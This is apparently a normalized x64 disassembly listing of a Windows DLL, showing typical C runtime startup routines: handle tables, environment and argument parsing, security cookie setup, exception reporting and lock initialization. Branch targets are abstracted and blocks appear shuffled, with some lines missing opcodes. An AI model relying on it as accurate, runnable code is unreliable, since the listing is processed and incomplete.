mov rsi rbx
mov [ rsp + 0x30 ] rbx
mov r13 rax
mov [ rsp + 0x38 ] rax
mov rdi rax
mov [ rsp + 0x20 ] rax
jmp r-xdata
cmp r13 rax
je r-xdata
sub_180004790
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x90
lea rcx [ rsp + 0x20 ]
call [ GetStartupInfoW@IAT ]
mov edx 0x58
lea ebp [ rdx - 0x38 ]
mov ecx ebp
call sub_1800042e0
xor r14d r14d
mov rdx rax
test rax rax
jne r-xdata
mov [ rw-data ] rax
add rax 0xb00
mov ecx ebp
mov [ rw-data ] ecx
cmp rdx rax
jae r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ rsp + 0x62 ] r14w
je r-xdata
add rdx 0x9
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov rsp r11
pop r14
pop r13
pop r12
retn
mov r12d r14d
mov rbx r14
mov rax [ rsp + 0x68 ]
test rax rax
je r-xdata
or [ rdx - 0x9 ] 0xffffffffffffffff
mov [ rdx - 0x1 ] 0xa00
mov [ rdx + 0x3 ] r14d
mov [ rdx + 0x2f ] 0xa00
mov [ rdx + 0x31 ] 0xa
mov [ rdx + 0x47 ] r14d
mov [ rdx + 0x43 ] r14b
mov rax [ rw-data ]
add rdx 0x58
lea rcx [ rdx - 0x9 ]
add rax 0xb00
cmp rcx rax
jb r-xdata
mov ecx [ rw-data ]
lea eax [ r12 - 0x1 ]
mov [ rbx + rdi + 0x8 ] 0x81
neg eax
mov eax 0xfffffff6
sbb ecx ecx
add ecx 0xfffffff5
test r12d r12d
cmove ecx eax
call [ GetStdHandle@IAT ]
mov rbp rax
cmp rax 0xffffffffffffffff
je r-xdata
cmp [ rbx + rdi ] 0xfffffffffffffffe
je r-xdata
movsxd r12 [ rax ]
mov ebx 0x800
lea r13 [ rax + 0x4 ]
add r12 r13
cmp [ rax ] ebx
cmovl ebx [ rax ]
cmp ecx ebx
jge r-xdata
or [ rbx + rdi + 0x8 ] 0x40
mov [ rbx + rdi ] 0xfffffffffffffffe
test rax rax
je r-xdata
or [ rbx + rdi + 0x8 ] 0x80
jmp r-xdata
mov edi r14d
test ebx ebx
jle r-xdata
lea rdi [ rw-data ]
mov rdi [ rw-data ]
cmp [ rbx + rdi ] 0xffffffffffffffff
je r-xdata
mov ecx [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
mov rcx rax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
add rbx 0x58
inc r12d
cmp rbx 0x108
jl r-xdata
cmp [ r12 ] 0xffffffffffffffff
je r-xdata
mov ebx [ rw-data ]
mov edx [ rw-data ]
lea rcx [ rax + 0xb00 ]
mov [ rdi ] rax
add edx ebp
mov [ rw-data ] edx
cmp rax rcx
jae r-xdata
movzx eax al
mov [ rbx + rdi ] rbp
cmp eax 0x2
jne r-xdata
inc edi
inc r13
add r12 0x8
cmp edi ebx
jl r-xdata
cmp [ r12 ] 0xfffffffffffffffe
je r-xdata
add rdi 0x8
cmp edx ebx
jl r-xdata
lea rdx [ rax + 0x9 ]
cmp eax 0x3
jne r-xdata
or [ rbx + rdi + 0x8 ] 0x40
jmp r-xdata
test [ r13 ] 0x1
je r-xdata
mov edx 0x58
mov rcx rbp
call sub_1800042e0
test rax rax
je r-xdata
jmp r-xdata
or [ rdx - 0x9 ] 0xffffffffffffffff
and [ rdx + 0x2f ] 0x80
mov [ rdx - 0x1 ] 0xa00
mov [ rdx + 0x3 ] r14d
mov [ rdx + 0x30 ] 0xa0a
mov [ rdx + 0x47 ] r14d
mov [ rdx + 0x43 ] r14b
mov rax [ rdi ]
add rdx 0x58
lea rcx [ rdx - 0x9 ]
add rax 0xb00
cmp rcx rax
jb r-xdata
mov edx [ rw-data ]
lea rcx [ rbx + rdi + 0x10 ]
mov edx 0xfa0
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ rbx + rdi + 0x8 ] 0x8
test [ r13 ] 0x8
jne r-xdata
inc [ rbx + rdi + 0xc ]
jmp r-xdata
movsxd rbp edi
lea rcx [ rw-data ]
mov edx 0xfa0
mov rax rbp
and ebp 0x1f
sar rax 0x5
imul rbp rbp 0x58
add rbp [ rcx + rax * 8 ]
mov rax [ r12 ]
mov [ rbp ] rax
mov al [ r13 ]
lea rcx [ rbp + 0x10 ]
mov [ rbp + 0x8 ] al
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
mov rcx [ r12 ]
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ rbp + 0xc ]
sub_180004a64
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
lea rbx [ rw-data ]
mov esi 0x40
add rbx 0x8
dec rsi
jne r-xdata
lea rax [ rdi + 0xb00 ]
jmp r-xdata
mov rdi [ rbx ]
test rdi rdi
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp rdi rax
jb r-xdata
cmp [ rdi + 0xc ] 0x0
je r-xdata
mov rcx [ rbx ]
call sub_1800035c8
and [ rbx ] 0x0
mov rax [ rbx ]
add rdi 0x58
add rax 0xb00
lea rcx [ rdi + 0x10 ]
call [ DeleteCriticalSection@IAT ]
sub_180004ad8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
cmp [ rw-data ] 0x0
jne r-xdata
mov rbx [ rw-data ]
xor edi edi
test rbx rbx
jne r-xdata
call sub_180006794
mov al [ rbx ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
lea eax [ rdi + 0x1 ]
mov edx 0x8
movsxd rcx eax
call sub_1800042e0
mov rdi rax
mov [ rw-data ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov rcx rbx
call sub_180006d30
lea rbx [ rbx + rax + 0x1 ]
inc edi
mov rbx [ rw-data ]
cmp [ rbx ] 0x0
je r-xdata
mov rcx rbx
call sub_1800035c8
and [ rw-data ] 0x0
and [ rdi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
mov rcx rbx
call sub_180006d30
cmp [ rbx ] 0x3d
lea esi [ rax + 0x1 ]
je r-xdata
movsxd rax esi
add rbx rax
cmp [ rbx ] 0x0
jne r-xdata
movsxd rbp esi
mov edx 0x1
mov rcx rbp
call sub_1800042e0
mov [ rdi ] rax
test rax rax
je r-xdata
mov rbx [ rw-data ]
mov rcx [ rw-data ]
call sub_1800035c8
and [ rw-data ] 0x0
jmp r-xdata
mov r8 rbx
mov rdx rbp
mov rcx rax
call sub_180006cb0
test eax eax
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180005428
int3
add rdi 0x8
sub_180004c08
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov r13 [ rsp + 0x60 ]
mov r14 r9
mov rdi r8
and [ r13 ] 0x0
mov r12 rdx
mov rbx rcx
mov [ r9 ] 0x1
test rdx rdx
je r-xdata
xor ebp ebp
mov [ rdx ] r8
add r12 0x8
inc [ r13 ]
test rdi rdi
je r-xdata
xor eax eax
test ebp ebp
mov sil 0x22
sete al
inc rbx
mov ebp eax
jmp r-xdata
movzx esi [ rbx ]
inc rbx
mov ecx esi
call sub_180006e54
test eax eax
je r-xdata
mov al [ rbx ]
mov [ rdi ] al
inc rdi
test ebp ebp
jne r-xdata
test sil sil
je r-xdata
inc [ r13 ]
test rdi rdi
je r-xdata
cmp [ rbx ] 0x22
jne r-xdata
cmp sil 0x20
je r-xdata
dec rbx
inc rbx
mov al [ rbx ]
mov [ rdi ] al
inc rdi
test rdi rdi
je r-xdata
cmp sil 0x9
jne r-xdata
test r12 r12
je r-xdata
cmp [ rbx ] 0x20
je r-xdata
xor esi esi
mov [ rdi - 0x1 ] 0x0
jmp r-xdata
inc [ r14 ]
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
and [ r12 ] 0x0
inc rbx
jmp r-xdata
cmp [ rbx ] 0x9
jne r-xdata
cmp [ rbx ] 0x0
je r-xdata
test r12 r12
je r-xdata
inc [ r14 ]
mov [ r12 ] rdi
add r12 0x8
cmp [ rbx ] 0x5c
je r-xdata
inc rbx
inc ecx
cmp [ rbx ] 0x22
jne r-xdata
test ecx ecx
jne r-xdata
test dl cl
jne r-xdata
dec ecx
test rdi rdi
je r-xdata
mov al [ rbx ]
test al al
je r-xdata
shr ecx 0x1
jmp r-xdata
test esi esi
je r-xdata
inc [ r13 ]
mov [ rdi ] 0x5c
inc rdi
test rdi rdi
je r-xdata
test esi esi
jne r-xdata
xor eax eax
xor edx edx
test esi esi
sete al
mov esi eax
lea rax [ rbx + 0x1 ]
cmp [ rax ] 0x22
jne r-xdata
inc [ r13 ]
jmp r-xdata
mov [ rdi ] 0x0
inc rdi
test edx edx
je r-xdata
cmp al 0x20
je r-xdata
mov rbx rax
jmp r-xdata
cmp [ rbx ] 0x0
je r-xdata
inc rbx
jmp r-xdata
movsx ecx al
call sub_180006e54
test rdi rdi
je r-xdata
cmp al 0x9
je r-xdata
mov edx 0x1
xor ecx ecx
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
inc [ r13 ]
inc rbx
inc [ r13 ]
mov al [ rbx ]
mov [ rdi ] al
inc rdi
jmp r-xdata
mov al [ rbx ]
inc rbx
mov [ rdi ] al
inc rdi
inc [ r13 ]
sub_180004dd8
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x30
cmp [ rw-data ] 0x0
jne r-xdata
lea rdi [ rw-data ]
mov r8d 0x104
xor ecx ecx
mov rdx rdi
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
mov rbx [ rw-data ]
mov [ rw-data ] rdi
test rbx rbx
je r-xdata
call sub_180006794
mov rbx rdi
cmp [ rbx ] 0x0
jne r-xdata
or eax 0xffffffff
movsxd rcx [ rsp + 0x48 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rax [ rsp + 0x48 ]
lea r9 [ rsp + 0x40 ]
xor r8d r8d
xor edx edx
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_180004c08
movsxd rsi [ rsp + 0x40 ]
mov rcx 0x1fffffffffffffff
cmp rsi rcx
jae r-xdata
lea rdx [ rcx + rsi * 8 ]
cmp rdx rcx
jb r-xdata
mov rcx rdx
call sub_180004260
mov rdi rax
test rax rax
je r-xdata
lea r8 [ rax + rsi * 8 ]
lea rax [ rsp + 0x48 ]
lea r9 [ rsp + 0x40 ]
mov rdx rdi
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_180004c08
mov r11d [ rsp + 0x40 ]
mov [ rw-data ] rdi
dec r11d
xor eax eax
mov [ rw-data ] r11d
jmp r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
sub_180004ed0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x40
call [ GetEnvironmentStringsW@IAT ]
xor r12d r12d
mov rdi rax
test rax rax
je r-xdata
xor eax eax
mov rbx rax
cmp [ rax ] r12w
je r-xdata
mov [ rsp + 0x38 ] r12
sub rbx rax
mov [ rsp + 0x30 ] r12
sar rbx 0x1
mov r8 rax
xor edx edx
lea r9d [ rbx + 0x1 ]
xor ecx ecx
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] r12
call [ WideCharToMultiByte@IAT ]
movsxd rbp eax
test eax eax
je r-xdata
add rbx 0x2
cmp [ rbx ] r12w
jne r-xdata
mov rcx rdi
call [ FreeEnvironmentStringsW@IAT ]
mov rcx rbp
call sub_180004260
mov rsi rax
test rax rax
je r-xdata
add rbx 0x2
cmp [ rbx ] r12w
jne r-xdata
mov [ rsp + 0x38 ] r12
mov [ rsp + 0x30 ] r12
lea r9d [ rbx + 0x1 ]
mov r8 rdi
xor edx edx
xor ecx ecx
mov [ rsp + 0x28 ] ebp
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
mov rcx rdi
call [ FreeEnvironmentStringsW@IAT ]
mov rax rsi
jmp r-xdata
mov rcx rsi
call sub_1800035c8
mov rsi r12
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
sub_180004fc4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rbx 0x8
call rax
sub_180004ffc
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rbx 0x8
call rax
sub_180005034
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rsi rdx
mov edi ecx
call sub_180003fc0
xor r9d r9d
mov rbx rax
test rax rax
je r-xdata
xor eax eax
mov rdx [ rax + 0xa0 ]
mov rcx rdx
lea rax [ rdx + 0xc0 ]
cmp rcx rax
jae r-xdata
lea rax [ rdx + 0xc0 ]
add rcx 0x10
cmp rcx rax
jb r-xdata
mov rcx r9
cmp [ rcx ] edi
je r-xdata
cmp [ rcx ] edi
je r-xdata
mov r8 [ rcx + 0x8 ]
test r8 r8
je r-xdata
test rcx rcx
je r-xdata
cmp r8 0x5
jne r-xdata
cmp r8 0x1
jne r-xdata
mov [ rcx + 0x8 ] r9
lea eax [ r8 - 0x4 ]
jmp r-xdata
mov rbp [ rbx + 0xa8 ]
mov [ rbx + 0xa8 ] rsi
cmp [ rcx + 0x4 ] 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov [ rcx + 0x8 ] r9
mov ecx [ rcx + 0x4 ]
call r8
mov edx 0x30
mov rax [ rbx + 0xa0 ]
add rdx 0x10
mov [ rdx + rax - 0x8 ] r9
cmp rdx 0xc0
jl r-xdata
cmp [ rcx ] 0xc000008e
mov edi [ rbx + 0xb0 ]
jne r-xdata
cmp [ rcx ] 0xc0000090
jne r-xdata
mov [ rbx + 0xb0 ] 0x83
jmp r-xdata
cmp [ rcx ] 0xc0000091
jne r-xdata
mov [ rbx + 0xb0 ] 0x81
jmp r-xdata
mov edx [ rbx + 0xb0 ]
mov ecx 0x8
call r8
mov [ rbx + 0xb0 ] edi
jmp r-xdata
cmp [ rcx ] 0xc0000093
jne r-xdata
mov [ rbx + 0xb0 ] 0x84
jmp r-xdata
mov [ rbx + 0xa8 ] rbp
jmp r-xdata
cmp [ rcx ] 0xc000008d
jne r-xdata
mov [ rbx + 0xb0 ] 0x85
jmp r-xdata
cmp [ rcx ] 0xc000008f
jne r-xdata
mov [ rbx + 0xb0 ] 0x82
jmp r-xdata
cmp [ rcx ] 0xc0000092
jne r-xdata
mov [ rbx + 0xb0 ] 0x86
jmp r-xdata
cmp [ rcx ] 0xc00002b5
jne r-xdata
mov [ rbx + 0xb0 ] 0x8a
jmp r-xdata
cmp [ rcx ] 0xc00002b4
mov eax edi
mov edx 0x8e
cmove eax edx
mov [ rbx + 0xb0 ] eax
mov [ rbx + 0xb0 ] 0x8d
jmp r-xdata
sub_180005218
mov [ rsp + 0x18 ] rbx
push rdi
sub rsp 0x20
mov rax [ rw-data ]
and [ rsp + 0x30 ] 0x0
mov rdi 0x2b992ddfa232
cmp rax rdi
je r-xdata
lea rcx [ rsp + 0x30 ]
call [ GetSystemTimeAsFileTime@IAT ]
mov rbx [ rsp + 0x30 ]
call [ GetCurrentProcessId@IAT ]
mov r11d eax
xor rbx r11
call [ GetCurrentThreadId@IAT ]
mov r11d eax
xor rbx r11
call [ GetTickCount@IAT ]
lea rcx [ rsp + 0x38 ]
mov r11d eax
xor rbx r11
call [ QueryPerformanceCounter@IAT ]
mov r11 [ rsp + 0x38 ]
xor r11 rbx
mov rax 0xffffffffffff
and r11 rax
mov rax 0x2b992ddfa233
cmp r11 rdi
cmove r11 rax
mov [ rw-data ] r11
not r11
mov [ rw-data ] r11
not rax
mov [ rw-data ] rax
jmp r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_1800052dc
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rbp
push rdi
push r12
lea rbp [ rsp - 0x4f0 ]
sub rsp 0x5f0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x4e0 ] rax
mov edi r8d
mov esi edx
mov ebx ecx
cmp ecx 0xffffffff
je r-xdata
and [ rsp + 0x70 ] 0x0
lea rcx [ rsp + 0x74 ]
xor edx edx
mov r8d 0x94
call sub_1800030c0
lea r11 [ rsp + 0x70 ]
lea rax [ rbp + 0x10 ]
lea rcx [ rbp + 0x10 ]
mov [ rsp + 0x48 ] r11
mov [ rsp + 0x50 ] rax
call [ RtlCaptureContext@IAT ]
mov r12 [ rbp + 0x108 ]
lea rdx [ rsp + 0x40 ]
mov rcx r12
xor r8d r8d
call RtlLookupFunctionEntry
test rax rax
je r-xdata
call sub_1800052cc
mov rax [ rbp + 0x508 ]
mov [ rbp + 0x108 ] rax
lea rax [ rbp + 0x508 ]
mov [ rbp + 0xa8 ] rax
and [ rsp + 0x38 ] 0x0
mov rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x60 ]
mov [ rsp + 0x30 ] rcx
lea rcx [ rsp + 0x58 ]
mov r9 rax
mov [ rsp + 0x28 ] rcx
lea rcx [ rbp + 0x10 ]
mov r8 r12
mov [ rsp + 0x20 ] rcx
xor ecx ecx
call RtlVirtualUnwind
jmp r-xdata
mov rcx [ rbp + 0x4e0 ]
xor rcx rsp
call sub_180003090
lea r11 [ rsp + 0x5f0 ]
mov rbx [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rsp r11
pop r12
pop rdi
pop rbp
retn
test edi edi
jne r-xdata
mov rax [ rbp + 0x508 ]
mov [ rsp + 0x70 ] esi
mov [ rsp + 0x74 ] edi
mov [ rbp - 0x80 ] rax
call [ IsDebuggerPresent@IAT ]
xor ecx ecx
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ rsp + 0x48 ]
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
mov ecx ebx
call sub_1800052cc
sub_18000545c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
mov rbp rcx
mov rcx [ rw-data ]
mov ebx r9d
mov rdi r8
mov rsi rdx
call [ DecodePointer@IAT ]
mov r9d ebx
mov r8 rdi
mov rdx rsi
mov rcx rbp
test rax rax
je r-xdata
mov rax [ rsp + 0x60 ]
mov [ rsp + 0x20 ] rax
call sub_180005428
int3
mov r10 [ rsp + 0x60 ]
mov [ rsp + 0x20 ] r10
call rax
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
sub_1800054ec
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
sub rsp 0x20
lea r12 [ rw-data ]
xor esi esi
xor ebx ebx
mov rdi r12
inc ebx
add rdi 0x10
cmp ebx 0x24
jl r-xdata
movsxd rax esi
mov edx 0xfa0
inc esi
lea rcx [ rax + rax * 4 ]
lea rax [ rw-data ]
lea rcx [ rax + rcx * 8 ]
mov [ rdi ] rcx
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ rdi + 0x8 ] 0x1
jne r-xdata
mov eax 0x1
movsxd rax ebx
add rax rax
and [ r12 + rax * 8 ] 0x0
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
add rsp 0x20
pop r12
retn
sub_180005570
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov edi 0x24
lea rbx [ rw-data ]
mov esi edi
add rbx 0x10
dec rsi
jne r-xdata
cmp [ rbx + 0x8 ] 0x1
je r-xdata
mov rbp [ rbx ]
test rbp rbp
je r-xdata
lea rbx [ rw-data ]
mov rcx rbp
call [ DeleteCriticalSection@IAT ]
mov rcx rbp
call sub_1800035c8
and [ rbx ] 0x0
add rbx 0x10
dec rdi
jne r-xdata
cmp [ rbx ] 0x1
jne r-xdata
mov rcx [ rbx - 0x8 ]
test rcx rcx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
call [ DeleteCriticalSection@IAT ]
sub_180005610
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r13
sub rsp 0x20
movsxd rbx ecx
mov esi 0x1
cmp [ rw-data ] 0x0
jne r-xdata
mov rdi rbx
add rdi rdi
lea r13 [ rw-data ]
cmp [ r13 + rdi * 8 ] 0x0
je r-xdata
call sub_1800059c8
lea ecx [ rsi + 0x1d ]
call sub_180005768
mov ecx 0xff
call sub_180004428
mov ecx 0x28
call sub_180004260
mov rbx rax
test rax rax
jne r-xdata
mov eax esi
jmp r-xdata
mov ecx 0xa
call sub_1800056f8
nop
mov rcx rbx
cmp [ r13 + rdi * 8 ] 0x0
jne r-xdata
call sub_180003afc
mov [ rax ] 0xc
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
add rsp 0x20
pop r13
retn
call sub_1800035c8
nop
mov edx 0xfa0
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ r13 + rdi * 8 ] rbx
jmp r-xdata
mov rcx rbx
call sub_1800035c8
call sub_180003afc
mov [ rax ] 0xc
xor esi esi
jmp r-xdata
mov rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
jmp r-xdata
sub_1800056f8
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rbx ecx
lea rdi [ rw-data ]
add rbx rbx
cmp [ rdi + rbx * 8 ] 0x0
jne r-xdata
mov rcx [ rdi + rbx * 8 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
jmp [ EnterCriticalSection@IAT ]
call sub_180005610
test eax eax
jne r-xdata
lea ecx [ rax + 0x11 ]
call sub_180004768
sub_18000573c
lea r8 [ r--data ]
xor eax eax
mov rdx r8
cdqe
add rax rax
mov rax [ r8 + rax * 8 + 0x8 ]
retn
inc eax
add rdx 0x10
cmp eax 0x16
jb r-xdata
cmp ecx [ rdx ]
je r-xdata
xor eax eax
retn
sub_180005768
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
push r12
push r13
sub rsp 0x250
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x240 ] rax
mov edi ecx
call sub_18000573c
xor esi esi
mov rbx rax
test rax rax
je r-xdata
mov rcx [ rsp + 0x240 ]
xor rcx rsp
call sub_180003090
lea r11 [ rsp + 0x250 ]
mov rbx [ r11 + 0x28 ]
mov rbp [ r11 + 0x30 ]
mov rsi [ r11 + 0x38 ]
mov rsp r11
pop r13
pop r12
pop rdi
retn
lea ecx [ rsi + 0x3 ]
call sub_180007250
cmp eax 0x1
je r-xdata
mov ecx 0xfffffff4
call [ GetStdHandle@IAT ]
mov rdi rax
test rax rax
je r-xdata
lea ecx [ rsi + 0x3 ]
call sub_180007250
test eax eax
jne r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
cmp edi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
mov edx esi
lea r8 [ rsp + 0x40 ]
lea rbp [ rw-data ]
mov r12d 0x314
lea r8 [ r--data ]
mov rcx rbp
mov edx r12d
call sub_1800071e4
xor ecx ecx
test eax eax
jne r-xdata
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x233 ] sil
call sub_180006d30
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0x40 ]
mov rcx rdi
mov r8 rax
mov [ rsp + 0x20 ] rsi
call [ WriteFile@IAT ]
inc edx
inc r8
add rbx 0x2
cmp edx 0x1f4
jb r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
mov [ rsp + 0x20 ] rsi
call sub_180005428
int3
lea r13 [ rw-data ]
mov r8d 0x104
mov [ rw-data ] si
mov rdx r13
call [ GetModuleFileNameW@IAT ]
lea edi [ r12 - 0x19 ]
test eax eax
jne r-xdata
mov cl [ rbx ]
mov [ r8 ] cl
cmp [ rbx ] si
je r-xdata
mov rcx r13
call sub_1800071c8
inc rax
cmp rax 0x3c
jbe r-xdata
lea r8 [ r--data ]
mov edx edi
mov rcx r13
call sub_1800071e4
test eax eax
je r-xdata
lea r8 [ r--data ]
mov rdx r12
mov rcx rbp
call sub_180007070
test eax eax
jne r-xdata
mov rcx r13
call sub_1800071c8
lea r8 [ r--data ]
mov r9d 0x3
lea rcx [ rbp + rax * 2 - 0x44 ]
mov rax rcx
sub rax r13
sar rax 0x1
sub rdi rax
mov rdx rdi
call sub_1800070f8
test eax eax
je r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_180005428
int3
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_180005428
int3
mov r8 rbx
mov rdx r12
mov rcx rbp
call sub_180007070
test eax eax
jne r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_180005428
int3
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_180005428
int3
lea rdx [ r--data ]
mov r8d 0x12010
mov rcx rbp
call sub_180006e68
jmp r-xdata
sub_1800059c8
sub rsp 0x28
mov ecx 0x3
call sub_180007250
cmp eax 0x1
je r-xdata
mov ecx 0xfc
call sub_180005768
mov ecx 0xff
call sub_180005768
mov ecx 0x3
call sub_180007250
test eax eax
jne r-xdata
add rsp 0x28
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_180005a90
mov rax rcx
mov ecx 0x5a4d
cmp [ rax ] cx
je r-xdata
movsxd rcx [ rax + 0x3c ]
add rcx rax
xor eax eax
cmp [ rcx ] 0x4550
jne r-xdata
xor eax eax
retn
retn
mov edx 0x20b
cmp [ rcx + 0x18 ] dx
sete al
sub_180005ac0
movsxd r8 [ rcx + 0x3c ]
xor r9d r9d
mov r10 rdx
add r8 rcx
movzx eax [ r8 + 0x14 ]
movzx r11d [ r8 + 0x6 ]
lea rcx [ rax + r8 + 0x18 ]
test r11d r11d
je r-xdata
xor eax eax
retn
mov edx [ rcx + 0xc ]
cmp r10 rdx
jb r-xdata
inc r9d
add rcx 0x28
cmp r9d r11d
jb r-xdata
mov eax [ rcx + 0x8 ]
add eax edx
cmp r10 rax
jb r-xdata
mov rax rcx
retn
sub_180005b10
sub rsp 0x28
mov r8 rcx
lea r9 [ __dos_header ]
mov rcx r9
call sub_180005a90
test eax eax
je r-xdata
add rsp 0x28
retn
sub r8 r9
mov rdx r8
mov rcx r9
call sub_180005ac0
test rax rax
je r-xdata
mov eax [ rax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
jmp r-xdata
sub_180005b54
[ rcx ]
mov rax [ rcx + 0x110 ]
test rax rax
je r-xdata
mov rax [ rcx + 0x120 ]
test rax rax
je r-xdata
[ rax ]
mov rax [ rcx + 0x118 ]
test rax rax
je r-xdata
[ rax ]
mov rax [ rcx + 0x130 ]
test rax rax
je r-xdata
[ rax ]
lea rax [ rcx + 0x58 ]
mov r8d 0x6
[ rax ]
cmp [ rax - 0x8 ] 0x0
je r-xdata
mov rdx [ rax ]
test rdx rdx
je r-xdata
add rax 0x20
dec r8
jne r-xdata
mov rdx [ rax + 0x8 ]
test rdx rdx
je r-xdata
[ rdx ]
lea rdx [ rw-data ]
cmp [ rax - 0x10 ] rdx
je r-xdata
mov rax [ rcx + 0x158 ]
[ rax + 0x160 ]
retn
[ rdx ]
sub_180005be0
test rcx rcx
je r-xdata
